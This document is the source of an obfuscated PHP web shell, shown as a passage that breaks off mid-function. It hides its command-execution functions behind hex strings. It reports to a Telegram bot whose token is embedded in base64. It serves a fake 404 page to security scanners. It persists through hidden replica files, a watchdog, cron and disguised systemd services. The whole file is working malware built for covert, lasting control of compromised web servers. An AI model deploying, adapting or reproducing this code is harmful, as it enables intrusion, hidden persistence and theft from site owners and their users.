<?php
function wn_fn($k) {
    static $m = null;
    if ($m === null) {
        $m = [
            'se'=>"\x73\x68\x65\x6c\x6c\x5f\x65\x78\x65\x63",'sy'=>"\x73\x79\x73\x74\x65\x6d",
            'ex'=>"\x65\x78\x65\x63",'pa'=>"\x70\x61\x73\x73\x74\x68\x72\x75",
            'po'=>"\x70\x6f\x70\x65\x6e",'pc'=>"\x70\x72\x6f\x63\x5f\x6f\x70\x65\x6e",
            'fpc'=>"\x66\x69\x6c\x65\x5f\x70\x75\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73",
            'fgc'=>"\x66\x69\x6c\x65\x5f\x67\x65\x74\x5f\x63\x6f\x6e\x74\x65\x6e\x74\x73",
            'b64d'=>"\x62\x61\x73\x65\x36\x34\x5f\x64\x65\x63\x6f\x64\x65",
            'b64e'=>"\x62\x61\x73\x65\x36\x34\x5f\x65\x6e\x63\x6f\x64\x65",
            'cu_i'=>"\x63\x75\x72\x6c\x5f\x69\x6e\x69\x74",'cu_e'=>"\x63\x75\x72\x6c\x5f\x65\x78\x65\x63",
            'cu_s'=>"\x63\x75\x72\x6c\x5f\x73\x65\x74\x6f\x70\x74",'cu_c'=>"\x63\x75\x72\x6c\x5f\x63\x6c\x6f\x73\x65",
            'cu_g'=>"\x63\x75\x72\x6c\x5f\x67\x65\x74\x69\x6e\x66\x6f",
        ];
    }
    return $m[$k] ?? '';
}
function wn_fn_exists($k) { $f = wn_fn($k); return $f !== '' && function_exists($f); }
function wn_call($k) { $f = wn_fn($k); if ($f === '' || !function_exists($f)) return null; $a = func_get_args(); array_shift($a); return @$f(...$a); }

error_reporting(0);
@ini_set('display_errors', 0);
@ini_set('max_execution_time', 0);
@ini_set('memory_limit', '256M');
@ob_start();

set_error_handler(function ($no, $str, $file, $line) {
    if (!(error_reporting() & $no)) return true;
    @file_put_contents(sys_get_temp_dir() . '/wn_errors.log', date('Y-m-d H:i:s') . " [E$no] $str in $file:$line\n", FILE_APPEND);
    return true;
});
register_shutdown_function(function () {
    $e = error_get_last();
    if ($e && in_array($e['type'], [E_ERROR, E_PARSE, E_CORE_ERROR, E_COMPILE_ERROR], true)) {
        @file_put_contents(sys_get_temp_dir() . '/wn_errors.log', date('Y-m-d H:i:s') . " [FATAL E{$e['type']}] {$e['message']} in {$e['file']}:{$e['line']}\n", FILE_APPEND);
    }
});

define('WN_STEALTH_PARAM', 'p');
define('WN_STEALTH_TTL', 604800);
define('WN_STEALTH_MIN_MS', 8);
define('WN_STEALTH_MAX_MS', 45);
define('WN_DEBUG', false);

function wn_tg_base() { static $b = null; if ($b === null) $b = wn_call('b64d', 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2JvdA=='); return $b; }
function wn_tg_filebase() { static $b = null; if ($b === null) $b = wn_call('b64d', 'aHR0cHM6Ly9hcGkudGVsZWdyYW0ub3JnL2ZpbGUvYm90'); return $b; }
function wn_cfg_b64() { return ['k'=>'OTAyNTc1Njc1MzpBQUdYTkNzcUVYYWVxb1FjLW03b1RkcXhNVkp3N2E0V1RUOA==', 'j'=>'NzU0NzU5ODM5NQ==']; }
$_wn_c = wn_cfg_b64();
$__B = wn_call('b64d', $_wn_c['k']);
$__C = wn_call('b64d', $_wn_c['j']);
unset($_wn_c);
$CURRENT_SHELL = basename(__FILE__);
$rootPath = realpath(__DIR__) ?: __DIR__;
$notifyDelete = true;
$specialDirectories = [
    'public_html'=>isset($_SERVER['DOCUMENT_ROOT']) ? realpath($_SERVER['DOCUMENT_ROOT']) : null,
    'user'=>realpath('/home'),'etc'=>realpath('/etc'),'log'=>realpath('/var/log'),
    'homeshell'=>$rootPath,'tmp'=>'/tmp','dev_shm'=>'/dev/shm',
];
$specialDirectories = array_filter($specialDirectories, function ($d) { return $d && is_dir($d); });

function wn_safe_host() {
    $h = $_SERVER['HTTP_HOST'] ?? ''; if ($h === '') return $_SERVER['SERVER_NAME'] ?? 'localhost';
    if (!preg_match('/^[a-zA-Z0-9\.\-:]+$/', $h)) return $_SERVER['SERVER_NAME'] ?? 'localhost';
    $sn = strtolower($_SERVER['SERVER_NAME'] ?? ''); $hl = strtolower($h);
    if ($sn === '' || $hl === $sn || substr($hl, -strlen('.'.$sn)) === '.'.$sn) return $h;
    return $_SERVER['SERVER_NAME'] ?? 'localhost';
}
function wn_is_scanner() {
    $ua = $_SERVER['HTTP_USER_AGENT'] ?? '';
    if ($ua === '' || strlen($ua) < 15) return true;
    $uaLow = strtolower($ua);
    foreach (['nuclei','nikto','nmap','masscan','sqlmap','acunetix','nessus','openvas','burp','zap','xray','wpscan','dirbuster','gobuster','wfuzz','ffuf','ferox','whatweb','w3af','skipfish','arachni','python-requests','python-urllib','go-http-client','curl/','wget/','libwww-perl','lwp-','httpclient','java/','okhttp','scrapy','phantomjs','headless','puppeteer','selenium','zgrab','shodan','censys','binaryedge','internetmeasurement'] as $p) if (strpos($uaLow, $p) !== false) return true;
    return false;
}
function wn_get_home() {
    $h = getenv('HOME'); if ($h && is_dir($h)) return $h;
    if (function_exists('posix_getpwuid')) { $p = posix_getpwuid(posix_getuid()); if ($p && !empty($p['dir']) && is_dir($p['dir'])) return $p['dir']; }
    if (!empty($_SERVER['HOME']) && is_dir($_SERVER['HOME'])) return $_SERVER['HOME'];
    $dr = $_SERVER['DOCUMENT_ROOT'] ?? ''; if ($dr && preg_match('#^(/home/[^/]+)#', $dr, $m)) return $m[1];
    return '';
}
function wn_state_dir() {
    static $c = null; if ($c !== null) return $c;
    $home = wn_get_home();
    $candidates = [];
    if ($home) { $candidates[] = $home . '/.cache'; $candidates[] = $home; }
    if (!empty($_SERVER['DOCUMENT_ROOT'])) $candidates[] = $_SERVER['DOCUMENT_ROOT'] . '/.wn';
    $candidates[] = sys_get_temp_dir();
    $candidates[] = '/tmp';
    foreach ($candidates as $d) {
        if (!$d) continue;
        if (!is_dir($d)) @mkdir($d, 0700, true);
        if (!is_dir($d) || !is_writable($d)) continue;
        // Write test — bukan hanya is_writable
        $t = $d . '/.wnt_' . getmypid() . '_' . mt_rand();
        if (@file_put_contents($t, '1') === 1) {
            @unlink($t);
            $c = $d; return $c;
        }
    }
    $c = sys_get_temp_dir(); return $c;
}
function wn_blend_name($kind) {
    static $map = null;
    if ($map === null) {
        global $CURRENT_SHELL;
        $seed = substr(hash('sha256', 'blend:' . $CURRENT_SHELL . ':' . __DIR__), 0, 32);
        $h = substr($seed, 0, 16); $h2 = substr($seed, 16, 16);
        $map = [
            'salt'=>'/.cache_'.$h.'.dat','stealth_key'=>'/.session_'.$h.'.tmp','stealth_on'=>'/.lock_'.$h2,
            'daemon_pid'=>'/.'.$h.'.pid','watchdog_pid'=>'/.'.$h2.'.lock','daemon_php'=>'/.upd_'.$h.'.cache',
            'watchdog_php'=>'/.tmp_'.$h.'.cache','heartbeat'=>'/.beat_'.$h.'.log','started'=>'/.init_'.$h.'.dat',
            'last_selfheal'=>'/.hc_'.$h.'.log','activity'=>'/.act_'.$h.'.log','deadman'=>'/.dm_'.$h.'.conf',
            'deadman_noted'=>'/.dmn_'.$h.'.log','rm_pending'=>'/.rm_'.$h.'.tmp','sd_pending'=>'/.sd_'.$h.'.tmp',
            'cron_backup'=>'/.cronbak_'.$h.'.txt','otp'=>'/.otp_'.$h,'lock'=>'/.lk_'.$h,'live'=>'/.lv_'.$h,
            'offset'=>'/.of_'.$h,'last'=>'/.ls_'.$h,'blocked'=>'/.bl_'.$h,'fail'=>'/.fl_'.$h,
            'stealth_fail'=>'/.sf_'.$h,'stealth_ban'=>'/.sb_'.$h,'stealth_otp'=>'/.so_'.$h,
            'wrap_selfheal'=>'/.wsh_'.$h,'replica'=>'/.rp_'.$h,'replica_bak'=>'/.rpb_'.$h,
            'shell_mtime'=>'/.mt_'.$h.'.dat',
            'integrity_check'=>'/.ic_'.$h,'integrity_alert'=>'/.ia_'.$h,
            'integrity_pause'=>'/.ip_'.$h,'integrity_pause_ttl'=>'/.ipt_'.$h,
            'fleet_key'=>'/.fk_'.$h.'.dat','fleet_id'=>'/.fi_'.$h,'fleet_registry'=>'/.fr_'.$h.'.json',
            'dying'=>'/.dy_'.$h,
            'layer_heal'=>'/.lh_'.$h,
        ];
    }
    return wn_state_dir() . $map[$kind];
}
function wn_can_shell() {
    static $cache = null; if ($cache !== null) return $cache;
    $disabled = array_map('trim', explode(',', ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73") ?: ''));
    foreach (['se','sy','ex','pa','po','pc'] as $k) {
        $f = wn_fn($k);
        if ($f !== '' && function_exists($f) && !in_array($f, $disabled, true)) { $cache = true; return $cache; }
    }
    $cache = false; return $cache;
}
function cmd_exec($cmd, &$output = null) {
    $output = '';
    if (!wn_can_shell()) { $output = '[shell disabled]'; return false; }
    $disabled = array_map('trim', explode(',', ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73") ?: ''));
    foreach (['se','sy','ex','pa'] as $k) {
        $func = wn_fn($k);
        if ($func === '' || !function_exists($func) || in_array($func, $disabled, true)) continue;
        try {
            if ($k === 'se') { $r = wn_call('se', $cmd); if ($r !== null) { $output = $r; return $r; } }
            elseif ($k === 'sy') { ob_start(); wn_call('sy', $cmd); $o = ob_get_clean(); if ($o !== false && $o !== null) { $output = $o; return $o; } }
            elseif ($k === 'ex') { $o = []; wn_call('ex', $cmd, $o); if (!empty($o)) { $output = implode("\n", $o); return $output; } }
            elseif ($k === 'pa') { ob_start(); wn_call('pa', $cmd); $o = ob_get_clean(); if ($o !== false && $o !== null) { $output = $o; return $o; } }
        } catch (Throwable $e) { continue; }
    }
    if (wn_fn_exists('po') && !in_array(wn_fn('po'), $disabled, true)) {
        try { $fp = wn_call('po', $cmd, 'r'); if ($fp) { $o = ''; while (!feof($fp)) $o .= fread($fp, 4096); pclose($fp); $output = $o; return $o; } } catch (Throwable $e) {}
    }
    return false;
}
function wn_run_bg($cmd) {
    if (!wn_can_shell()) return false;
    $disabled = array_map('trim', explode(',', ini_get("\x64\x69\x73\x61\x62\x6c\x65\x5f\x66\x75\x6e\x63\x74\x69\x6f\x6e\x73") ?: ''));
    $hasSetsid = trim((string)cmd_exec('command -v setsid 2>/dev/null')) !== '';
    $hasNohup = trim((string)cmd_exec('command -v nohup 2>/dev/null')) !== '';
    if ($hasSetsid) $cmd = 'setsid ' . $cmd;
    elseif ($hasNohup) $cmd = 'nohup ' . $cmd;
    $cmd .= ' </dev/null >/dev/null 2>&1 &';
    if (function_exists('popen') && !in_array('popen', $disabled, true)) {
        try { $fp = @popen($cmd, 'r'); if ($fp) { @pclose($fp); return true; } } catch (Throwable $e) {}
    }
    if (function_exists('proc_open') && !in_array('proc_open', $disabled, true)) {
        try {
            $d = [0=>['file','/dev/null','r'], 1=>['file','/dev/null','w'], 2=>['file','/dev/null','w']];
            $p = @proc_open($cmd, $d, $pipes);
            if (is_resource($p)) { @proc_close($p); return true; }
        } catch (Throwable $e) {}
    }
    return false;
}
function is_shell_available() { static $a = null; if ($a !== null) return $a; if (!wn_can_shell()) { $a = false; return $a; } $t = cmd_exec('echo 1'); $a = ($t !== false && trim($t) === '1'); return $a; }
function isRoot() { if (!is_shell_available()) return false; return trim((string)cmd_exec('whoami 2>/dev/null')) === 'root'; }
function formatSize($bytes) {
    if (!is_numeric($bytes)) return '0 bytes';
    if ($bytes >= 1073741824) return number_format($bytes / 1073741824, 2) . ' GB';
    if ($bytes >= 1048576) return number_format($bytes / 1048576, 2) . ' MB';
    if ($bytes >= 1024) return number_format($bytes / 1024, 2) . ' KB';
    return $bytes . ' bytes';
}
function deleteDirectory($dir) {
    if (is_link($dir)) return @unlink($dir);
    if (!file_exists($dir)) return true;
    if (!is_dir($dir)) return @unlink($dir);
    if (!is_readable($dir) || !is_writable($dir)) @chmod($dir, 0700);
    $items = @scandir($dir);
    if ($items === false) { @chmod($dir, 0700); $items = @scandir($dir); if ($items === false) return false; }
    $ok = true;
    foreach ($items as $item) {
        if ($item === '.' || $item === '..') continue;
        $p = $dir . DIRECTORY_SEPARATOR . $item;
        if (is_link($p)) { if (!@unlink($p)) { @chmod($dir, 0700); if (!@unlink($p)) $ok = false; } continue; }
        if (is_dir($p)) { if (!deleteDirectory($p)) $ok = false; continue; }
        if (!@unlink($p)) { @chmod($p, 0600); @chmod($dir, 0700); if (!@unlink($p)) $ok = false; }
    }
    if (!@rmdir($dir)) { @chmod($dir, 0700); if (!@rmdir($dir)) $ok = false; }
    return $ok;
}
function isSafePath($path, $rootPath, $specialDirs) {
    $rp = @realpath($path); if ($rp === false) $rp = $path;
    $rr = @realpath($rootPath) ?: $rootPath;
    if ($rp === $rr) return true;
    if (strpos($rp, rtrim($rr, '/') . '/') === 0) return true;
    foreach ($specialDirs as $d) {
        if (!$d) continue;
        $rd = @realpath($d) ?: $d;
        if ($rp === $rd) return true;
        if (strpos($rp, rtrim($rd, '/') . '/') === 0) return true;
    }
    return false;
}
function sendJsonResponse($data) {
    while (ob_get_level() > 0) @ob_end_clean();
    if (!headers_sent()) { @header_remove('X-Powered-By'); header('Content-Type: application/json; charset=utf-8'); header('Cache-Control: no-store'); header('X-Content-Type-Options: nosniff'); }
    $out = json_encode($data, JSON_UNESCAPED_UNICODE | JSON_UNESCAPED_SLASHES);
    if ($out === false) $out = '{"status":"error","message":"json_encode failed"}';
    echo $out; exit;
}
function safe_truncate_utf8($str, $maxBytes) { if (strlen($str) <= $maxBytes) return $str; $r = @mb_strcut($str, 0, $maxBytes, 'UTF-8'); return $r === false ? substr($str, 0, $maxBytes) : $r; }
function get_real_ip() { foreach (['HTTP_CF_CONNECTING_IP','HTTP_X_FORWARDED_FOR','HTTP_X_REAL_IP'] as $h) if (!empty($_SERVER[$h])) { $ips = explode(',', $_SERVER[$h]); return trim($ips[0]); } return $_SERVER['REMOTE_ADDR'] ?? ''; }
function wn_capture_mtime($path) { $mtime = @filemtime($path); if ($mtime === false || $mtime <= 0) $mtime = time(); $f = wn_blend_name('shell_mtime'); wn_call('fpc', $f, (string)$mtime, LOCK_EX); @chmod($f, 0600); return $mtime; }
function wn_get_stored_mtime() { $f = wn_blend_name('shell_mtime'); if (!file_exists($f)) return 0; $m = (int)wn_call('fgc', $f); return $m > 0 ? $m : 0; }
function wn_apply_mtime($path) { $m = wn_get_stored_mtime(); if ($m > 0 && file_exists($path)) { @touch($path, $m, $m); return true; } return false; }

function wn_tg_callback_handle() {
    global $__B;
    while (ob_get_level() > 0) @ob_end_clean();
    header('Content-Type: text/plain; charset=utf-8');
    $expectedKey = hash('sha256', 'wn_tg:' . $__B . ':' . wn_get_salt());
    if (!hash_equals($expectedKey, (string)($_GET['key'] ?? ''))) { http_response_code(403); echo 'FORBIDDEN'; exit; }
    $action = strtolower((string)($_GET['wn_tg'] ?? ''));
    switch ($action) {
        case 'reinstall':
            $result = auto_install_watcher_controller();
            if (($result['status'] ?? '') !== 'success') echo '[X] ' . ($result['message'] ?? 'Failed');
            else echo "[Reinstall]\nPHP: " . ($result['php_bin'] ?? '?') . "\nWatcher: " . ($result['watcher'] ?? '?') . "\nCron: " . (!empty($result['cron_ok']) ? 'OK' : 'NO');
            break;
        case 'uninstall':
            $result = auto_uninstall_watcher_controller();
            echo ($result['status'] ?? '') === 'success' ? '[Uninstalled] ' . ($result['message'] ?? 'OK') : '[X] ' . ($result['message'] ?? 'Failed');
            break;
        default:
            echo '[X] Unknown action: ' . $action;
    }
    exit;
}
function sendTelegramMessage($tk, $cid, $message, $plain = false) {
    if (empty($tk) || empty($cid) || empty($message)) return false;
    if (strlen($message) > 4096) $message = safe_truncate_utf8($message, 4000) . "\n...(truncated)";
    $url = wn_tg_base() . $tk . '/sendMessage';
    $data = ['chat_id'=>$cid,'text'=>$message,'disable_web_page_preview'=>'true'];
    if (!$plain) $data['parse_mode'] = 'HTML';
    $post = http_build_query($data);
    if (function_exists('curl_init')) {
        $ch = @curl_init();
        if ($ch !== false && $ch !== null) {
            @curl_setopt($ch, CURLOPT_URL, $url); @curl_setopt($ch, CURLOPT_POST, true);
            @curl_setopt($ch, CURLOPT_POSTFIELDS, $post); @curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
            @curl_setopt($ch, CURLOPT_TIMEOUT, 20); @curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
            @curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); @curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
            @curl_setopt($ch, CURLOPT_USERAGENT, 'Mozilla/5.0');
            $res = @curl_exec($ch); @curl_close($ch);
            if (is_string($res) && $res !== '') { $r = @json_decode($res, true); if (is_array($r) && isset($r['ok']) && $r['ok'] === true) return true; }
        }
    }
    if (ini_get('allow_url_fopen')) {
        $ctx = @stream_context_create(['http'=>['method'=>'POST','header'=>"Content-Type: application/x-www-form-urlencoded\r\nContent-Length: " . strlen($post) . "\r\n",'content'=>$post,'timeout'=>20,'ignore_errors'=>true],'ssl'=>['verify_peer'=>false,'verify_peer_name'=>false]]);
        if ($ctx !== false) { $res = @file_get_contents($url, false, $ctx); if (is_string($res) && $res !== '') { $r = @json_decode($res, true); if (is_array($r) && isset($r['ok']) && $r['ok'] === true) return true; } }
    }
    return false;
}
function wn_get_salt() {
    static $cached = null; if ($cached !== null) return $cached;
    $f = wn_blend_name('salt');
    if (!file_exists($f) || @filesize($f) < 16) {
        try { $newSalt = bin2hex(random_bytes(24)); }
        catch (Throwable $e) { global $__B, $rootPath; $newSalt = hash('sha256', 'x:' . ($__B ?? '') . ':' . $rootPath . ':' . uniqid('', true)); }
        wn_call('fpc', $f, $newSalt, LOCK_EX); @chmod($f, 0600);
    }
    $s = trim((string)wn_call('fgc', $f));
    if (strlen($s) < 16) { global $CURRENT_SHELL, $rootPath, $__B; $s = hash('sha256', 'fb:' . $CURRENT_SHELL . ':' . $rootPath . ':' . ($__B ?? '')); wn_call('fpc', $f, $s, LOCK_EX); @chmod($f, 0600); }
    $cached = $s; return $cached;
}
function wn_get_key($suffix = '') { global $CURRENT_SHELL; return substr(hash('sha256', 'k:' . wn_get_salt() . ':' . $CURRENT_SHELL . ':' . $suffix), 0, 16); }
function wn_backup_filename() { return '.' . wn_get_key('backup'); }
function wn_backup_locations() {
    $home = wn_get_home(); $name = wn_backup_filename(); $locs = [];
    if ($home && is_dir($home)) {
        foreach (['/.cache','/.config','/.local','/.cache/icons','/.config/systemd'] as $sub) {
            $dir = $home . $sub;
            if (!is_dir($dir)) @mkdir($dir, 0700, true);
            if (is_dir($dir) && is_writable($dir)) $locs[] = $dir . '/' . $name;
        }
    }
    return array_values(array_unique($locs));
}
function wn_stealth_key_file() { return wn_blend_name('stealth_key'); }
function wn_stealth_on_file() { return wn_blend_name('stealth_on'); }
function wn_stealth_cookie_name() { return 'PHPSESSID_' . substr(md5(wn_get_salt()), 0, 4); }
function wn_stealth_key() {
    static $k = null; if ($k !== null) return $k;
    $f = wn_stealth_key_file(); $k = file_exists($f) ? trim((string)wn_call('fgc', $f)) : '';
    if (strlen($k) < 16) { try { $k = bin2hex(random_bytes(16)); } catch (Throwable $e) { $k = substr(hash('sha256', 'sk:' . wn_get_salt() . microtime(true)), 0, 32); } wn_call('fpc', $f, $k, LOCK_EX); @chmod($f, 0600); }
    return $k;
}
function wn_stealth_enabled() { return file_exists(wn_stealth_on_file()); }
function wn_stealth_ua_hash() { $ua = $_SERVER['HTTP_USER_AGENT'] ?? ''; return substr(hash('sha256', 'u:' . $ua), 0, 16); }
function wn_session_poison($ttl = 3600) { if (session_status() !== PHP_SESSION_ACTIVE) @session_start(); $_SESSION['_wh'] = ['n'=>bin2hex(random_bytes(16)),'e'=>time()+$ttl,'u'=>wn_stealth_ua_hash(),'p'=>$_SERVER['REMOTE_ADDR'] ?? '']; }
function wn_session_verify() {
    if (session_status() !== PHP_SESSION_ACTIVE) return false;
    if (empty($_SESSION['_wh'])) return false;
    $st = $_SESSION['_wh'];
    if (empty($st['e']) || $st['e'] < time()) { unset($_SESSION['_wh']); return false; }
    if (!hash_equals(wn_stealth_ua_hash(), $st['u'] ?? '')) return false;
    return true;
}
function wn_stealth_issue_cookie($ttl = WN_STEALTH_TTL) {
    while (ob_get_level() > 0) @ob_end_clean();
    $exp = time() + $ttl; $ua = wn_stealth_ua_hash();
    $sig = hash_hmac('sha256', 'stealth|' . $exp . '|' . $ua, wn_auth_secret());
    $val = $exp . '.' . $ua . '.' . $sig;
    $isHttps = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') || (($_SERVER['HTTP_X_FORWARDED_PROTO'] ?? '') === 'https') || (($_SERVER['SERVER_PORT'] ?? '') == 443);
    $params = ['expires'=>$exp,'path'=>'/','httponly'=>true,'samesite'=>'Lax'];
    if ($isHttps) $params['secure'] = true;
    if (!headers_sent()) { @header_remove('X-Powered-By'); setcookie(wn_stealth_cookie_name(), $val, $params); }
    $_COOKIE[wn_stealth_cookie_name()] = $val;
    wn_session_poison($ttl);
}
function wn_stealth_verify_cookie() {
    $c = $_COOKIE[wn_stealth_cookie_name()] ?? ''; if (empty($c)) return false;
    $parts = explode('.', $c); if (count($parts) !== 3) return false;
    list($exp, $ua, $sig) = $parts;
    if (!ctype_digit($exp) || (int)$exp < time()) return false;
    if (!hash_equals(wn_stealth_ua_hash(), $ua)) return false;
    return hash_equals(hash_hmac('sha256', 'stealth|' . $exp . '|' . $ua, wn_auth_secret()), $sig);
}
function wn_stealth_fail_file() { return wn_blend_name('stealth_fail') . '_' . md5(get_real_ip()); }
function wn_stealth_ban_file() { return wn_blend_name('stealth_ban') . '_' . md5(get_real_ip()); }
function wn_stealth_is_banned() { $f = wn_stealth_ban_file(); if (!file_exists($f)) return false; $t = (int)wn_call('fgc', $f); if (time() - $t > 3600) { @unlink($f); return false; } return true; }
function wn_stealth_note_fail() {
    global $__B, $__C;
    $f = wn_stealth_fail_file(); $d = @json_decode(wn_call('fgc', $f), true);
    if (!is_array($d) || !isset($d['first']) || (time() - (int)$d['first']) > 900) $d = ['n'=>1,'first'=>time()]; else $d['n']++;
    wn_call('fpc', $f, json_encode($d), LOCK_EX); @chmod($f, 0600);
    if ($d['n'] >= 10) { wn_call('fpc', wn_stealth_ban_file(), time(), LOCK_EX); sendTelegramMessage($__B, $__C, "[STEALTH BAN]\nIP: " . htmlspecialchars(get_real_ip(), ENT_QUOTES, 'UTF-8') . "\nGagal {$d['n']}x / 15m\nBan 1 jam", true); }
}
function wn_stealth_note_ok() { @unlink(wn_stealth_fail_file()); }
function wn_stealth_otp_file() { return wn_blend_name('stealth_otp'); }
function wn_stealth_gen_otp($ttl = 300) {
    try { $token = bin2hex(random_bytes(16)); } catch (Throwable $e) { $token = substr(hash('sha256', microtime(true) . mt_rand()), 0, 32); }
    $json = json_encode(['t'=>$token,'e'=>time()+$ttl]); if ($json === false) return '';
    $f = wn_stealth_otp_file();
    $w = wn_call('fpc', $f, $json, LOCK_EX);
    if (!is_int($w) || $w <= 0) { $fp = @fopen($f, 'c'); if ($fp === false) return ''; @flock($fp, LOCK_EX); @ftruncate($fp, 0); $n = @fwrite($fp, $json); @fflush($fp); @flock($fp, LOCK_UN); @fclose($fp); if (!is_int($n) || $n <= 0) return ''; }
    @chmod($f, 0600); return $token;
}
function wn_stealth_consume_otp($given) {
    $f = wn_stealth_otp_file(); if (!file_exists($f)) return false;
    $raw = wn_call('fgc', $f); if (!is_string($raw) || $raw === '') $raw = @file_get_contents($f);
    @unlink($f);
    if (!is_string($raw) || $raw === '') return false;
    $d = json_decode($raw, true);
    if (!is_array($d) || empty($d['t']) || empty($d['e'])) return false;
    if (time() > (int)$d['e']) return false;
    return hash_equals((string)$d['t'], (string)$given);
}
function wn_stealth_unlock() {
    if (!wn_stealth_enabled()) return true;
    if (wn_check_auth_cookie()) return true;
    if (wn_stealth_verify_cookie()) return true;
    if (wn_session_verify()) return true;
    if (wn_stealth_is_banned()) { wn_decoy_accept_aware(); }
    $key = '';
    if (!empty($_SERVER['HTTP_X_WN_KEY'])) $key = (string)$_SERVER['HTTP_X_WN_KEY'];
    elseif (isset($_GET[WN_STEALTH_PARAM])) { $key = (string)$_GET[WN_STEALTH_PARAM]; if (wn_stealth_consume_otp($key)) { wn_stealth_issue_cookie(); wn_stealth_note_ok(); return true; } }
    if ($key !== '' && hash_equals(wn_stealth_key(), $key)) { wn_stealth_issue_cookie(); wn_stealth_note_ok(); return true; }
    if ($key !== '') wn_stealth_note_fail();
    return false;
}
function wn_stealth_jitter() { $ms = random_int(WN_STEALTH_MIN_MS, WN_STEALTH_MAX_MS); usleep($ms * 1000); }
function wn_stealth_decoy() {
    while (ob_get_level() > 0) @ob_end_clean();
    if (!headers_sent()) { @header_remove('X-Powered-By'); @header_remove('X-Powered-By-PHP'); @header_remove('Set-Cookie'); @header_remove('Expires'); @header_remove('Cache-Control'); @header_remove('Pragma'); }
    @http_response_code(404);
    $method = strtoupper($_SERVER['REQUEST_METHOD'] ?? 'GET'); if ($method === 'HEAD') exit;
    $sw = strtolower($_SERVER['SERVER_SOFTWARE'] ?? ''); $srv = 'Apache';
    if (strpos($sw, 'nginx') !== false) $srv = 'nginx';
    elseif (strpos($sw, 'litespeed') !== false) $srv = 'LiteSpeed';
    if (!in_array($method, ['GET','POST'], true)) { @http_response_code(405); if (!headers_sent()) { header('Allow: GET, HEAD, POST'); header('Content-Length: 0'); } exit; }
    switch ($srv) {
        case 'nginx': $ct='text/html'; $body="<html>\r\n<head><title>404 Not Found</title></head>\r\n<body>\r\n<center><h1>404 Not Found</h1></center>\r\n<hr><center>nginx</center>\r\n</body>\r\n</html>\r\n"; break;
        case 'LiteSpeed': $ct='text/html; charset=UTF-8'; $body="<!DOCTYPE html>\n<html style=\"height:100%\">\n<head><meta charset=\"UTF-8\"><title>404 Not Found</title></head>\n<body style=\"margin:0;font-family:Arial,sans-serif\">\n<div style=\"display:flex;align-items:center;justify-content:center;height:100vh;flex-direction:column\">\n<h1 style=\"font-size:3em;margin:0\">404</h1>\n<p>Not Found</p>\n</div>\n</body>\n</html>"; break;
        default: $ct='text/html; charset=iso-8859-1'; $body='<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN">'."\n".'<html><head>'."\n".'<title>404 Not Found</title>'."\n".'</head><body>'."\n".'<h1>Not Found</h1>'."\n".'<p>The requested URL was not found on this server.</p>'."\n".'</body></html>'."\n"; break;
    }
    if (!headers_sent()) { header('Content-Type: ' . $ct); header('Content-Length: ' . strlen($body)); }
    echo $body; exit;
}
function wn_random_replica_dirs() {
    $home = wn_get_home(); $dirs = [];
    if ($home) foreach ([$home.'/.local/share',$home.'/.local/share/icons',$home.'/.local/share/.cache',$home.'/.config/.cache',$home.'/.config/icons',$home.'/.cache/.sys',$home.'/.cache/system',$home.'/.local/state',$home.'/.local/state/.cache',$home.'/.local/share/Trash'] as $d) { if (!is_dir($d)) @mkdir($d, 0700, true); if (is_dir($d) && is_writable($d)) $dirs[] = $d; }
    return $dirs;
}
function wn_replica_watcher_paths() {
    $paths = []; $dirs = wn_random_replica_dirs(); if (empty($dirs)) return $paths;
    $baseKey = wn_get_key('replica'); $names = ['.cache-'.$baseKey.'.cache','.sys-'.$baseKey.'.dat','.tmp-'.$baseKey.'.tmp','.data-'.$baseKey.'.bin','session-'.$baseKey.'.idx','.icon-'.$baseKey.'.log'];
    foreach ($dirs as $i => $d) $paths[] = $d . '/' . $names[$i % count($names)];
    return array_values(array_unique($paths));
}
function wn_replica_backup_paths() {
    $paths = []; $dirs = wn_random_replica_dirs(); if (empty($dirs)) return $paths;
    $baseKey = wn_get_key('replica_bak'); $names = ['.cache-'.$baseKey.'.log','.sys-'.$baseKey.'.dat','.tmp-'.$baseKey.'.tmp','.data-'.$baseKey.'.old'];
    foreach ($dirs as $i => $d) $paths[] = $d . '/' . $names[$i % count($names)];
    return array_values(array_unique($paths));
}
function wn_watcher_locations() {
    $home = wn_get_home(); $locs = [];
    if ($home) foreach (['/.cache','/.config','/.local'] as $sub) $locs[] = $home . $sub . '/php-sess-' . substr(md5(wn_get_key('w')), 0, 8) . '.cache';
    return array_values(array_unique(array_merge($locs, wn_replica_watcher_paths())));
}
function wn_wrapper_locations() {
    $home = wn_get_home(); $locs = [];
    if ($home) foreach (['/.cache','/.config','/.local'] as $sub) $locs[] = $home . $sub . '/.' . substr(md5(wn_get_key('wrap')), 0, 12) . '.bin';
    return array_values(array_unique($locs));
}
function wn_systemd_service_name() { return 'php-session-' . substr(md5(wn_get_key('svc') . wn_get_salt()), 0, 6); }
function wn_systemd_user_dir() { $home = wn_get_home(); if (!$home) return null; $dir = $home . '/.config/systemd/user'; if (!is_dir($dir)) @mkdir($dir, 0700, true); return (is_dir($dir) && is_writable($dir)) ? $dir : null; }
function wn_systemd_system_dir() { $dir = '/etc/systemd/system'; if (!is_dir($dir) || !is_writable($dir)) return null; return $dir; }
function wn_install_systemd($phpBin, $entry, &$log) {
    $svc = wn_systemd_service_name(); $phpEsc = escapeshellarg($phpBin); $entryEsc = escapeshellarg($entry);
    $unixUser = null; $unixGroup = null;
    if (function_exists('posix_getpwuid')) { $u = @posix_getpwuid(posix_getuid()); if ($u && !empty($u['name'])) $unixUser = $u['name']; }
    if (function_exists('posix_getgrgid')) { $g = @posix_getgrgid(posix_getgid()); if ($g && !empty($g['name'])) $unixGroup = $g['name']; }
    $userDirective = ''; if ($unixUser) { $userDirective = "\nUser=" . $unixUser; if ($unixGroup) $userDirective .= "\nGroup=" . $unixGroup; }
